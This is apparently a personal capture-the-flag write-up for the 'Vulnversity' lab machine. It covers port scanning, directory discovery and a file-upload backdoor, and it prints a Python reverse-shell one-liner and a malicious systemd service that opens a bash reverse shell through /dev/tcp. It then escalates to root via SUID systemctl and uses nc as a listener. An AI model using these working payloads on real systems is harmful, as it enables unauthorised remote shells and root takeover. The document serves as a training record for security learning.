# Vulnversity

export IP=10.10.241.128

## nmap
21			ftp 	3.0.3
22			ssh		7.2p2
139			Samba	3.X
445			Samba	4.3.11
3128	?	Squid	3.5.12
3333		apache	2.4.18

## 3333 - webhost

Frontpage

- viewsource
	No hints, no aperrant cms

- GoBuster
	* /internal
	* /internal/uploads

upload phtml cmd backdoor

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("	10.9.9.193",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

## Reverse shell

Stabelized the shell

Find suid binaries and notice /bin/systemctl
If systemctl has suid you can install a custom service that makes a second reverse shell

## Develop exploit

`root.service`
```
[Unit]
Description=roooot

[Service]
Type=simple
User=Root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.9.4.99/9998 0>&1'

[Install]
WantedBy=multi-user.target
```

## Deploy exploit

Save the exploit on the box.

Enable the exploit
`/bin/systemctl enable /tmp/pathtoexploit/root.service`

Listen for incomming calls
`nc -l 9998`

Run the exploit
`/bin/systemctl start root`

## Remote root shell!

The shell returned :)
After that stabelize a little, so `export TERM=xterm`

`cat /root/root.txt` gives the final flag